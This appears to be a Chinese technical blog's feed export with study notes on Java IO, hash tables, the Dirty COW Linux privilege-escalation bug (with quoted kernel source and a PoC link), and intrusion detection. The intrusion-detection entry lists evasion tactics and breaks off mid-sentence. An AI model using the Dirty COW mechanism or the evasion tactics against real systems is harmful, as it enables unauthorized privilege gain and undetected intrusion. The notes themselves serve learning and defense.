字节输出流&#x2F;字符输出流</p><h4 id="为什么要分字节流和字符流"><a href="#为什么要分字节流和字符流" class="headerlink" title="为什么要分字节流和字符流"></a>为什么要分字节流和字符流</h4><p>字符流实际上可以由Java虚拟机将字节转换得到，但是这个过程比较耗时并且容易出现乱码问题，因此IO流就提供了一个直接操作字符的接口，方便平时对字符进行流操作</p><h4 id="BIO、NIO、AIO的区别"><a href="#BIO、NIO、AIO的区别" class="headerlink" title="BIO、NIO、AIO的区别"></a>BIO、NIO、AIO的区别</h4><ul><li>BIO是同步阻塞IO模式，数据的读取和写入必须阻塞在一个线程内等待其完成。适用于低并发、低负载的情况</li><li>NIO是同步非阻塞IO模式，支持面向缓冲的，基于通道的IO方法，适用于高负载、高并发的应用</li><li>AIO是NIO的改进版，是异步非阻塞的IO模型。异步IO是基于时间和回调机制实现的，也就是应用操作之后会直接返回，当后台任务处理完成后系统会通知相应的线程执行后续的操作</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见数据结构与算法问题总结</title>
    <link href="/blog/2023/01/14/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2023/01/14/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><strong>刷了挺久的leetcode了，但是对一些底层的数据结构问题还是没有仔细学习过，针对一些常见的面试问题准备一下。数据结构是计算机存储、组织数据的方式。数据结构是指相互之间存在一种或多种特定关系的数据元素的集合。</strong></p><p><img src="/images/fj31.jpg"></p><p>数据的逻辑结构包括4种：</p><p>(1)集合：数据元素之间除了有相同的数据类型再没有其他的关系</p><p>(2)线性结构：数据元素之间是一对一的关系 ——线性表、栈、队列</p><p>(3)树形结构：数据元素之间是一对多的关系</p><p>(4)图状结构：数据元素之间是多对多的关系。</p><h2 id="数组和链表"><a href="#数组和链表" class="headerlink" title="数组和链表"></a>数组和链表</h2><h3 id="顺序存储和链式存储的区别？"><a href="#顺序存储和链式存储的区别？" class="headerlink" title="顺序存储和链式存储的区别？"></a>顺序存储和链式存储的区别？</h3><p>顺序存储结构是用一段连续的存储空间来存储数据元素，可以进行随机访问，访问效率较高。链式存储结构是用任意的存储空间来存储数据元素，不可以进行随机访问，访问效率较低。</p><h3 id="数组和链表的优缺点"><a href="#数组和链表的优缺点" class="headerlink" title="数组和链表的优缺点"></a>数组和链表的优缺点</h3><p>数组的优点：使用方便，查询效率比链表高，内存是一段连续的区域</p><p>数组的缺点：大小固定，不适合动态的插入、删除，插入删除会导致大量的元素移动</p><p>链表优点：大小可变，动态添加删除效率高</p><p>缺点：只能通过顺序指针访问，查询访问效率低</p><p>从逻辑结构来看：数组的存储长度是固定的，它不能适应数据动态增减的情况。链表能够动态分配存储空间以适应数据动态增减的情况，并且易于进行插入和删除操作。</p><p>从访问方式来看：数组在内存中是一片连续的存储空间，可以通过数组下标对数组进行随机访问，访问效率较高。链表是链式存储结构，存储空间不是必须连续的，可以是任意的，访问必须从前往后依次进行，访问效率较数组来说比较低。</p><p>如果从第i个位置插入多个元素，对于数组来说每一次插入都需要往后移动元素，每一次的时间复杂度都是O(n)，而单链表来说只需要在第一次寻找i的位置时时间复杂度为O(n)，其余的插入和删除操作时间复杂度均为O(1)，提高了插入和删除的效率。</p><h2 id="Hash表"><a href="#Hash表" class="headerlink" title="Hash表"></a>Hash表</h2><p>哈希表（又叫散列表）是根据关键码值(Key value)而直接进行访问的数据结构。也就是说，它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射函数叫做散列函数，存放记录的数组叫做散列表。</p><p>哈希方法思想：<br>首先在元素的关键字k和元素的存储位置p之间建立一个对应关系H，使得 p &#x3D; H(k)，H称为哈希函数。创建哈希表时，把关键字为k的元素直接存入地址为H(k)的单元，以后查找关键字为k的元素时，再利用哈希函数计算该元素的存储位置。再按关键字存取元素。Hash中存储的key值都是唯一的。</p><h3 id="哈希函数的构造方法"><a href="#哈希函数的构造方法" class="headerlink" title="哈希函数的构造方法"></a>哈希函数的构造方法</h3><p><strong>构造哈希函数原则：</strong><br>（1）函数本身便于计算<br>（2）计算出来的地址分布均匀，即对应任意一个关键字k，H(k)对应的不同地址的概率应该相同，以尽可能减少冲突</p><p>在实际应用中，构造哈希函数要考虑以下五个因素：<br>（1）计算哈希函数所需要的时间。哈希函数一定要简单，取放key值都需要根据哈希函数和key值计算位置，计算是要花时间的，尽可能要计算简单一点，这样计算时间也会少。<br>（2）关键字的长度。关键字过长，我们可以考虑取关键的某几位来建立哈希函数。<br>（3）哈希表的大小。哈希表可以减少查找次数，但是哈希表过短，或者过长都会使哈希法性能降低。<br>（4）关键字分布情况。为了使key值和哈希函数计算出来的地址分布均匀，要考虑关键字分布情况建立合适哈希函数。<br>（5）记录查找的频率。</p><p>哈希函数的构造方法包括：直接定址法，除留余数法，数字分析法，平方取中法，折叠法，随机数法：</p><p>(1)直接定址法：取关键字的某个线性函数值作为散列地址，H(key)&#x3D;a*key+b。</p><p>(2)除留余数法：顾名思义，即对key值进行取余。看有多少key值，如果有几十个key值，我们可以选择对10取余，对15取余，等等。余数就是对应的地址码。</p><p>(3)数字分析法：当关键字的位数大于地址的位数，对关键字的各位分布进行分析，选出分布均匀的任意几位作为散列的地址，适用于所有关键字都已知的情况。</p><p>(4)平方取中法：对关键字求平方，再取结果中的中间几位作为散列地址。</p><p>(5)折叠法：将关键字分为位数相同的几部分，然后取这几部分的叠加和作为散列地址。适用于关键字位数较多，且关键字中每一位上数字分布大致均匀。</p><p>(6)随机数法：选择一个随机函数，把关键字的随机函数值作为散列地址。适合于关键字的长度不相同时。<br>不论什么方法，目的都是为了在保证哈希函数尽可能简单的情况下让key值计算出来的地址码尽可能均匀。即让哈希表起到提高查找效率的作用。</p><h3 id="什么是Hash冲突（也叫“碰撞”）"><a href="#什么是Hash冲突（也叫“碰撞”）" class="headerlink" title="什么是Hash冲突（也叫“碰撞”）"></a>什么是Hash冲突（也叫“碰撞”）</h3><p>当关键字集合很大的时候，关键字值不同的元素可能会映射到哈希表的同一个地址，即k1 !&#x3D; k2，H(k1) &#x3D;&#x3D; H(k2)，这种现象称为冲突，此时k1和k2为同义词。事实上冲突是不可避免的，由于关键字可能发生冲突的集合远远大于实际开辟的哈希表长度 ，构成冲突的必然性，可通过改进哈希的性能来减少冲突，即降低冲突的可能性。</p><h3 id="哈希表冲突的解决办法"><a href="#哈希表冲突的解决办法" class="headerlink" title="哈希表冲突的解决办法"></a>哈希表冲突的解决办法</h3><ol><li><strong>开放地址法</strong>：当关键字key的哈希地址p&#x3D;H（key）出现冲突时，以p为基础，产生另一个哈希地址p1，如果p1仍然冲突，再以p为基础，产生另一个哈希地址p2，…，直到找出一个不冲突的哈希地址pi ，将相应元素存入其中。就是说当发生冲突时，就去寻找下一个空的地址把数据存入其中，只要哈希表足够大，就总能找到</li><li><strong>再哈希法</strong>：多个不同的Hash函数，当发生冲突时，使用第二个，第三个，….，等哈希函数<br>计算地址，直到无冲突。虽然不易发生聚集，但是增加了计算时间。</li><li><strong>建立公共溢出区</strong>：在创建哈希表的同时，再额外创建一个公共溢出区，专门用来存放发生哈希冲突的元素。查找时，先从哈希表查，查不到再去公共溢出区查。</li><li><strong>链地址法</strong>：每个哈希表节点都有一个next指针，多个哈希表节点可以用next指针构成一个单向链表，被分配到同一个索引上的多个节点可以用这个单向链表连接起来，因而查找、插入和删除主要在同义词链中进行。链地址法适用于经常进行插入和删除的情况。键值对k2, v2与键值对k1, v1通过计算后的索引值都为2，这时及产生冲突，但是可以通道next指针将k2, k1所在的节点连接起来，这样就解决了哈希的冲突问题。</li></ol><p>链地址法的优点和缺点：</p><p>优点：</p><ol><li>处理简单，无堆积现象，非同义词不会发生冲突，因此平均查找长度较短</li><li>由于节点是动态申请的，因此更适合确定表前无法确定表长的情况</li><li>开发地址法节点规模较大时会浪费较多空间，链地址法装填因子α较大，并且节点较大时链地址法增加的指针域可以忽略不计，因此节省空间。</li><li>链地址法构造的哈希表删除节点的操作易于实现，而开放地址法构造的哈希表删除时不能直接清空被删除的节点，只能标记删除，否则将截断在该节点之后插入的同义词节点的查找路径。</li></ol><p>缺点：</p><p>指针需要额外的空间，故当结点规模较小时，开放定址法较为节省空间，而若将节省的指针空间用来扩大散列表的规模，可使装填因子变小，这又减少了开放定址法中的冲突，从而提高平均查找速度。</p><h3 id="Java中HashMap和HashTable的区别"><a href="#Java中HashMap和HashTable的区别" class="headerlink" title="Java中HashMap和HashTable的区别"></a>Java中HashMap和HashTable的区别</h3><ol><li>HashMap是Hashtable的轻量级实现（非线程安全的实现），HashMap允许空（null）键值（key）,由于非线程安全，在只有一个线程访问的情况下，效率要高于Hashtable</li><li>HashMap把HashTable的contains方法去掉了，改成containsValue和containsKey</li><li>HashTable继承自Dictionary类，而HashMap是Java1.2引进的Map interface的一个实现</li><li>HashMap：在不指定容量的情况下的默认容量为16;要求一定为2的整数次幂;扩容时，将容量变为原来的2倍。HashTable中hash数组默认大小是11，增加的方式是old*2+1</li><li>HashTable直接使用对象的hashCode，HashMap重新计算hash值</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核提权——Dirty Copy-on-Write</title>
    <link href="/blog/2022/12/15/Linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94Dirty-Copy-on-Write/"/>
    <url>/blog/2022/12/15/Linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94Dirty-Copy-on-Write/</url>
    
    <content type="html"><![CDATA[<p><strong>之前针对Linux提权学习过利用SUID权限进行提权的方法，现在又看到了一种可以利用Linux内核竟态条件去写入文件导致只读文件可以写入的脏牛（Dirty COW）漏洞，学习一下基础原理。</strong></p><p><img src="/images/fj66.jpg"></p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="为什么这个漏洞叫脏牛（Dirty-COW）漏洞"><a href="#为什么这个漏洞叫脏牛（Dirty-COW）漏洞" class="headerlink" title="为什么这个漏洞叫脏牛（Dirty COW）漏洞"></a>为什么这个漏洞叫脏牛（Dirty COW）漏洞</h3><p>Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。</p><p>一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ul><li>非特权本地用户可利用此缺陷获得对其他只读内存映射的写入访问权限，从而增加其在系统上的权限。</li><li>此缺陷允许具有本地系统帐户的攻击者修改磁盘上的二进制文件，从而绕过标准权限机制，该机制可在没有适当权限集的情况下防止修改。</li></ul><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Linux内核&gt;&#x3D;2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。<a href="https://en.wikipedia.org/wiki/Linux_kernel_version_history">Linux内核版本历史</a>，<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/refs/tags">Linux kernel stable tree</a>。影响范围非常大，至今可能有一些系统还是使用较低版本内核。</p><h2 id="成因分析"><a href="#成因分析" class="headerlink" title="成因分析"></a>成因分析</h2><h3 id="get-user-pages-的主要逻辑"><a href="#get-user-pages-的主要逻辑" class="headerlink" title="__get_user_pages()的主要逻辑"></a>__get_user_pages()的主要逻辑</h3><p>这个函数能够获取用户进程调用的虚拟地址之后的物理地址，调用者需要声明它想要执行的具体操作(例如写&#x2F;锁等操作)，所以内存管理可以准备相对应的内存页。具体来说，也就是当进行写入私有映射的内存页时，会经过一个COW(写时拷贝)的过程，即复制只读页生成一个带有写权限的新页，原始页可能是私有保护不可写的，但它可以被其他进程映射使用。用户也可以在COW后的新页中修改内容之后重新写入到磁盘中。 　</p><p>源代码地址：<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/snapshot/linux-4.1.14.tar.gz">https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/snapshot/linux-4.1.14.tar.gz</a></p><p>mm&#x2F;gup.c  line 416</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> __get_user_pages(<span class="hljs-keyword">struct</span> task_struct *tsk，<span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gup_flags， <span class="hljs-keyword">struct</span> page **pages,<br>        <span class="hljs-keyword">struct</span> vm_area_struct **vmas，<span class="hljs-type">int</span> *nonblocking )<br>&#123;<br>    <span class="hljs-comment">//...</span><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> foll_flags = gup_flags;<br>        <span class="hljs-comment">// ...</span><br>        <span class="hljs-comment">/* first iteration or cross vma bound */</span><br>        <span class="hljs-comment">//</span><br>vma = find_extend_vma(mm,start);<br>        <span class="hljs-comment">// ...</span><br><br>retry:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment"> * potentially allocating memory.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br>            <span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>        cond_resched();<br>        page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br>        <span class="hljs-keyword">if</span> (!page) &#123;<br>            <span class="hljs-type">int</span> ret;<br>            ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br>                    nonblocking);<br>            <span class="hljs-keyword">switch</span> (ret) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">goto</span> retry;<br>                <span class="hljs-keyword">case</span> -EBUSY:<br>                ret = <span class="hljs-number">0</span>;<br>           <span class="hljs-keyword">case</span> -EFAULT:<br>           <span class="hljs-keyword">case</span> -ENOMEM:<br>               <span class="hljs-keyword">case</span> -EHWPOISON:<br>                <span class="hljs-keyword">goto</span> out;<br>           <span class="hljs-keyword">case</span> -ENOENT:<br>                <span class="hljs-keyword">goto</span> next_page;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>关键函数为follow_page_mask和faultin_page：</p><ul><li><p>follow_page_mask读取页表来获取指定地址的物理页(同时通过PTE允许)或获取不满足需求的请求内容。在follow_page_mask操作中会获取PTE的spinlock，用来保护试图获取内容的物理页不会被释放掉。</p></li><li><p>faultin_page函数申请内存管理的权限(同样有PTE的spinlock保护)来处理目标地址中的错误信息。在成功调用faultin_page后，锁会自动释放，从而保证follow_page_mask能够成功进行下一次尝试。</p></li></ul><p> 　</p><p>在对read_ONLY的COW页进行写操作时，正常流程是：</p><ol><li>follow_page_mask缺页,进页错误处理函数faultin_page,挂载页到物理内存</li><li>再次调用follow_page_mask,发现是一个READ_ONLY的PRIVATE,再次发生页错误,因此faultin_page需要去除FOLL_WRITE标签来让副本可写</li><li>再次调用follow_page_mask,正常返回页</li></ol><p>首先缺页，follow_page_mask和faultin_page返回0，同时faultin_page内:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment"> * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment"> * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment"> * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment"> * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment"> * reCOWed by userspace write).</span><br><span class="hljs-comment"> */</span><br>   <span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>           *flags |= FOLL_COW; <span class="hljs-comment">//漏洞修复后</span><br>           <span class="hljs-comment">//漏洞修复前 *flags &amp;= ~FOLL_WRITE;</span><br>       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>上面这个判断语句想要表示的是，如果当前VMA中的标志显示当前页不可写，但是用户又执行了页的写操作，那么内核会执行COW操作，并且在处理中会有VM_FAULT_WRITE标志。换句话说在执行了COW操作后，上面的if判断为真，这时就移除了FOLL_WRITE标志。</p><p>一般情况下在COW操作后移除FOLL_WRITE标志是没有问题的，因为这时VMA指向的页是刚经过写时拷贝复制的新页，我们是有写权限的，后续不进行写权限检查并不会有问题。 </p><p>但是，考虑这样一种情况，如果在这个时候用户通过madvise(MADV_DONTNEED)（这页内存之后很可能不再需要，操作系统会适时释放该页，但若后续出现了其他的线程，进程对该页的访问，该访问仍然成功，后续再次请求该页时会从底层映射文件的<strong>最新内容</strong>(对于共享文件映射、共享匿名映射和基于shmem的技术，如System V共享内存段)<strong>重新填充内存</strong>内容）将刚刚申请的新页丢弃掉，那这时本来在faultin_page后应该成功的follow_page_mask会再次失败，又会进入faultin_page的逻辑，但是这个时候已经没有FOLL_WRITE的权限检查了，只会检查可读性。这时内核就会将只读页面直接映射到我们的进程空间里，这时VMA指向的页不再是通过COW获得的页，而是文件的原始页，这就获得了任意写文件的能力。 　</p><h2 id="PoCs"><a href="#PoCs" class="headerlink" title="PoCs"></a>PoCs</h2><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">PoCs · dirtycow&#x2F;dirtycow.github.io Wiki · GitHub</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>入侵检测系统与入侵防御系统</title>
    <link href="/blog/2022/12/10/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E4%B8%8E%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/"/>
    <url>/blog/2022/12/10/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E4%B8%8E%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<p><strong>入侵检测系统（IDS, Intrusion Detection System）即通过从网络系统中的若干关键节点收集并分析信息，监控网络中是 否有违反安全策略的行为或者是否存在入侵行为。入侵防御系统（IPS,  Intrusion Prevention System）是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</strong></p><p><img src="/images/fj65.jpg"></p><h2 id="入侵检测系统"><a href="#入侵检测系统" class="headerlink" title="入侵检测系统"></a>入侵检测系统</h2><p>IDS是计算机的监视系统，它通过实时监视系统，一旦发现异常情况就发出警告。以信息来源的不同和检测方法的差异分为几类：根据信息来源可分为HIDS（Host-based Intrusion Detection System）和NIDS（Network Intrusion Detection System），根据检测方法又可分为异常入侵检测（类似于白名单，误报率较高）和误用入侵检测（类似于黑名单，漏报率较高）。<strong>绝大多数IDS系统都是被动的</strong>，也就是说，在攻击实际发生之前，它们往往无法预先发出警报。</p><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><h4 id="检测信息收集"><a href="#检测信息收集" class="headerlink" title="检测信息收集"></a>检测信息收集</h4><p>信息收集包括收集系统，网络，数据及用户活动的状态和行为，入侵检测利用的信息一般来自：系统和网络日志文件、非正常的目录和文件改变、非正常的程序执行这三个方面。</p><h4 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h4><p>对收集到的有关系统、网络、数据以及用户的活动状态和行为等信息，进行基于签名、基于统计异常和有状态协议等分析。</p><h4 id="告警与响应"><a href="#告警与响应" class="headerlink" title="告警与响应"></a>告警与响应</h4><p>根据入侵性质和类型，做出相应的告警与响应。 它能够提供安全审计、监视、攻击识别和反攻击等多项功能，对内部攻击、外部攻击和误操作进行实时监控，在网络安全技术中起到了不可替代的作用。</p><h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><h4 id="实时监测"><a href="#实时监测" class="headerlink" title="实时监测"></a>实时监测</h4><p>实时地监视、分析网络中所有的数据报文，发现并实时处理所捕获的数据报文。</p><h4 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h4><p>对系统记录的网络事件进行统计分析，发现异常现象，得出系统的安全状态，找出所需要的证据</p><h4 id="主动响应"><a href="#主动响应" class="headerlink" title="主动响应"></a>主动响应</h4><p>主动切断连接或与防火墙联动，调用其他程序处理</p><h3 id="根据信息来源分类"><a href="#根据信息来源分类" class="headerlink" title="根据信息来源分类"></a>根据信息来源分类</h3><h4 id="主机入侵检测系统"><a href="#主机入侵检测系统" class="headerlink" title="主机入侵检测系统"></a>主机入侵检测系统</h4><p>主机入侵检测系统 （HIDS） 在网络上的各个主机或设备上运行。其检测的目标主要是主机系统和系统本地用户，检测原理是根据主机的审计数据和系统日志发现可疑事件。HIDS 仅监视来自设备的入站和出站数据包，并在检测到可疑活动时向用户或管理员发出警报。它拍摄现有系统文件的快照，并将其与上一个快照匹配。如果修改或删除了关键系统文件，则会向管理员发送警报进行调查。</p><ol><li>优点：信息更详细、误报率要低、部署灵活。</li><li>缺点：会降低应用系统的性能；依赖于服务器原有的日志与监视能力；代价较大；不能对网络进行监测；需安装多个针对不同系统的检测系统。</li></ol><h4 id="网络入侵检测系统"><a href="#网络入侵检测系统" class="headerlink" title="网络入侵检测系统"></a>网络入侵检测系统</h4><p>网络入侵检测系统 （NIDS） 放置在网络中的一个或多个关键位置，以监控进出网络上所有设备的流量。它对整个子网上的传递流量进行分析，并将子网上传递的流量与已知攻击库进行匹配。一旦识别出攻击或检测到异常行为，就可以将警报发送给管理员。当我们根据系统交互性对NIDS的设计进行分类时，有两种类型：在线和离线NIDS，通常分别称为内联和抽头模式。在线NIDS实时处理网络。它分析以太网数据帧并应用一些规则，以确定它是否是攻击。离线NIDS处理存储的数据，并通过一些过程来决定它是否是攻击。NIDS还可以与深度神经网络技术结合使用，以提高检测率和预测率。</p><ol><li>优点：能够检测那些来自网络的攻击和超过授权的非法访问；不需要改变服务器等主机的配置，也不会影响主机性能；风险低；配置简单。</li><li>缺点：成本高、检测范围受局限；大量计算，影响系统性能；大量分析数据流，影响系统性能；对加密的会话过程处理较难；网络流速高时可能会丢失许多封包，容易让入侵者有机可乘。</li></ol><h3 id="根据检测方法分类"><a href="#根据检测方法分类" class="headerlink" title="根据检测方法分类"></a>根据检测方法分类</h3><h4 id="异常入侵检测"><a href="#异常入侵检测" class="headerlink" title="异常入侵检测"></a>异常入侵检测</h4><p>由于恶意软件的快速发展，因此引入基于异常的入侵检测系统，主要用于检测未知攻击。基本方法是使用机器学习创建可信活动模型，然后将新行为与此模型进行比较。由于这些模型可以根据应用程序和硬件配置进行训练，因此与传统的基于签名的IDS相比，基于机器学习的方法具有更好的通用属性。尽管此方法能够检测以前未知的攻击，但它可能会遭受误报：以前未知的合法活动也可能被归类为恶意。大多数现有的 IDS 在检测过程中都非常耗时，这会降低 IDS 的性能。</p><p>常用检测方法：</p><ol><li><strong>基于统计的技术：</strong>通过使用标准差、均值、阈值和概率对偏离特定行为的程度进行评分来<a href="https://www.sciencedirect.com/science/article/pii/S0950705119304897#b64">识别异常</a>。最早的方法使用单变量模型，后来的方法采用了<a href="https://www.sciencedirect.com/science/article/pii/S0950705119304897#b5">多变量模型和时间序列模型</a>。</li><li><strong>基于知识的技术</strong>：这些技术依赖于过去在异常和正常的操作下观察到的参数和知识的存在。基于专家知识的技术可以使用专家知识系统、有限状态机、描述语言和数据聚类。</li><li><strong>机器学习和深度学习技术</strong>：学习算法通过从过去的经验中学习而无需人工干预来提高IDS的性能。已经针对IDS应用研究了各种机器学习算法。文献中最常用的算法包括<a href="https://www.sciencedirect.com/topics/computer-science/support-vector-machine">支持向量机</a>（SVM）、<a href="https://www.sciencedirect.com/topics/mathematics/naive-bayes">朴素贝叶</a>斯、<a href="https://www.sciencedirect.com/topics/mathematics/genetic-algorithms">遗传算法</a>（GA）、k-最近邻（K-NN）、决策树（DT）、模糊逻辑和<a href="https://www.sciencedirect.com/topics/computer-science/artificial-neural-network">人工神经网络</a>（ANN）。此外，具有不平衡类分布的入侵数据集可以通过采样技术或不平衡学习算法来解决。最近，也有研究人员利用深度网络的独特性质进行特征学习和分类。</li></ol><h4 id="误用入侵检测（基于签名的IDS）"><a href="#误用入侵检测（基于签名的IDS）" class="headerlink" title="误用入侵检测（基于签名的IDS）"></a>误用入侵检测（基于签名的IDS）</h4><p>通过查找特定模式来检测攻击，例如网络流量中的字节序列或恶意软件使用的已知恶意指令序列。 此类IDS 可以轻松检测已知攻击，但很难检测到没有可用模式的新攻击。</p><p>常用检测方法：</p><ol><li><p><strong>模式匹配法</strong>：是常常被用于入侵检测技术中。它是通过把收集到的信息与网络入侵和系统误用模式数据库中的已知信息进行比较，从而对违背安全策略的行为进行发现。模式匹配法可以显著地减少系统负担，有较高的检测率和准确率。</p></li><li><p><strong>专家系统法</strong>：这个方法的思想是把安全专家的知识表示成规则知识库，再用推理算法检测入侵。主要是针对有特征的入侵行为。</p></li><li><p><strong>基于状态转移分析的检测法</strong>：该方法的基本思想是将攻击看成一个连续的、分步骤的并且各个步骤之间有一定的关联的过程。在网络中发生入侵时及时阻断入侵行为，防止可能还会进一步发生的类似攻击行为。在状态转移分析方法中，一个渗透过程可以看作是由攻击者做出的一系列的行为而导致系统从某个初始状态变为最终某个被危害的状态。</p></li></ol><h3 id="IDS系统的限制"><a href="#IDS系统的限制" class="headerlink" title="IDS系统的限制"></a>IDS系统的限制</h3><ol><li>噪声会严重限制入侵检测系统的有效性。由软件错误、损坏的 DNS 数据以及逃逸的本地数据包生成的错误数据包可能会产生非常高的误报率。</li><li>真实攻击的数量通常远远低于误报的数量，以至于真正的攻击经常被遗漏和忽略。</li><li>许多攻击都是针对通常过时的特定版本的软件。需要一个不断变化的签名库来缓解威胁。过时的签名数据库可能会使 IDS 容易受到新策略的影响。</li><li>对于基于签名的 IDS，新的威胁发现与其签名应用于 IDS 之间存在延迟。在此滞后时间内，IDS 将无法识别威胁。</li><li>它无法弥补薄弱的识别和认证机制或网络协议的弱点。当攻击者由于身份验证机制较弱而获得访问权限时，IDS 无法阻止攻击者发生任何不当行为。</li><li>大多数入侵检测设备不处理加密数据包。因此，加密数据包可以允许在发生更严重的网络入侵之前未发现的网络入侵。</li><li>入侵检测软件根据与发送到网络的 IP 数据包关联的网络地址提供信息。如果 IP 数据包中包含的网络地址准确，这将非常有用。但是，IP 数据包中包含的地址可能是伪造或加扰的。</li><li>由于NIDS系统的性质，以及它们需要在捕获协议时对其进行分析，NIDS系统可能容易受到网络主机可能易受攻击的基于协议的攻击。无效数据和 TCP&#x2F;IP 堆栈攻击可能会导致 NIDS 崩溃。</li><li>云计算上的安全措施没有考虑用户隐私需求的变化。它们为所有用户提供相同的安全机制，无论用户是公司还是个人。</li></ol><h3 id="IDS绕过技术"><a href="#IDS绕过技术" class="headerlink" title="IDS绕过技术"></a>IDS绕过技术</h3><ol><li>分段：通过发送分段数据包，攻击者将在雷达下，可以轻松绕过检测系统检测攻击特征的能力。</li><li>避免默认值：协议使用的 TCP 端口并不总是为正在传输的协议提供指示。例如，IDS 可能期望在端口 12345 上检测到特洛伊木马。如果攻击者将其重新配置为使用其他端口，IDS 可能无法检测到特洛伊木马的存在。</li><li>协调的低带宽攻击：协调众多攻击者（或代理）之间的扫描并将不同的端口或主机分配给不同的攻击者，使 IDS 